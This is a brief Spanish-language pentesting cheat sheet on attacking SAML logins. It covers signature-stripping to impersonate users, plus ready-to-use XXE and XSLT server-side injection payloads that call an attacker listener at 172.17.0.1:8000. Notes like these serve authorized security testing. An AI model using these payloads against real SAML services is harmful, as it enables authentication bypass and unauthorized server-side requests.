## Atomático

SAML Raider en burp suite

---

## Manual
### Signature exclusion attack

Si un servidor está muy mal configurado, podríamos intentar borrar todas las signatures dentro del XML.

Estas signatures se encuentran en las tags **"ds:Signature"**.

Puede haber muchas signatures en un mismo xml.

Una vez eliminadas estas firmas podemos empezar a cambiar nuestros datos para imperonar a otros usuarios.

### XXE

Al ser un XML y trabajar con tags, podemos inyectar XXE. Ej:

    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://172.17.0.1:8000"> %xxe; ]>
    <samlp:Response>
    	[...]
    </samlp:Response>

Más info en el módulo de XXE:

        https://github.com/LaPorota/LaPorota_suite/blob/main/web/XXE.md

### XSLT Server-side Injection

Esta vulnerabilidad corresponde al parser de los XML y se da cuando los datos recibidos no son correctamente verificados.

De existir, esta vulnerabilidad puede darse incluso con SAML responses inválidas.
#####  Ejemplo
        <?xml version="1.0" encoding="utf-8"?>
        <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="/">
        <xsl:copy-of select="document('http://172.17.0.1:8000/')"/>
        </xsl:template>
        </xsl:stylesheet>
